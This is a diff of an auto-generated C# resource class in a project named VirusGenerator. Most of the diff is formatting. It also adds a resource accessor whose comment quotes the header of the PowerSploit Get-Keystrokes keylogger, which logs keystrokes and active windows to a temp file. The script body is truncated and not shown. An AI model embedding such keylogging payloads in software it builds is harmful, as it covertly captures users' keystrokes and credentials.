@@ -8,10 +8,10 @@
 // </auto-generated>
 //------------------------------------------------------------------------------
 
-namespace VirusGenerator.Properties
-{
-
-
+namespace VirusGenerator.Properties {
+    using System;
+    
+    
     /// <summary>
     ///   A strongly-typed resource class, for looking up localized strings, etc.
     /// </summary>
@@ -22,49 +22,68 @@ namespace VirusGenerator.Properties
     [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
     [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
     [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
-    internal class Resources
-    {
-
+    internal class Resources {
+        
         private static global::System.Resources.ResourceManager resourceMan;
-
+        
         private static global::System.Globalization.CultureInfo resourceCulture;
-
+        
         [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
-        internal Resources()
-        {
+        internal Resources() {
         }
-
+        
         /// <summary>
         ///   Returns the cached ResourceManager instance used by this class.
         /// </summary>
         [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
-        internal static global::System.Resources.ResourceManager ResourceManager
-        {
-            get
-            {
-                if ((resourceMan == null))
-                {
+        internal static global::System.Resources.ResourceManager ResourceManager {
+            get {
+                if (object.ReferenceEquals(resourceMan, null)) {
                     global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("VirusGenerator.Properties.Resources", typeof(Resources).Assembly);
                     resourceMan = temp;
                 }
                 return resourceMan;
             }
         }
-
+        
         /// <summary>
         ///   Overrides the current thread's CurrentUICulture property for all
         ///   resource lookups using this strongly typed resource class.
         /// </summary>
         [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
-        internal static global::System.Globalization.CultureInfo Culture
-        {
-            get
-            {
+        internal static global::System.Globalization.CultureInfo Culture {
+            get {
                 return resourceCulture;
             }
-            set
-            {
+            set {
                 resourceCulture = value;
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to function Get-Keystrokes {
+        ///&lt;#
+        ///.SYNOPSIS
+        /// 
+        ///    Logs keys pressed, time and the active window.
+        ///    
+        ///    PowerSploit Function: Get-Keystrokes
+        ///    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
+        ///    License: BSD 3-Clause
+        ///    Required Dependencies: None
+        ///    Optional Dependencies: None
+        ///    
+        ///.PARAMETER LogPath
+        ///
+        ///    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to &apos;$($Env:TEMP)\key.log&apos;.
+        ///
+        ///.PARAMETER CollectionInterval
+        ///
+        ///     [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string Get_Keystrokes {
+            get {
+                return ResourceManager.GetString("Get_Keystrokes", resourceCulture);
             }
         }
     }
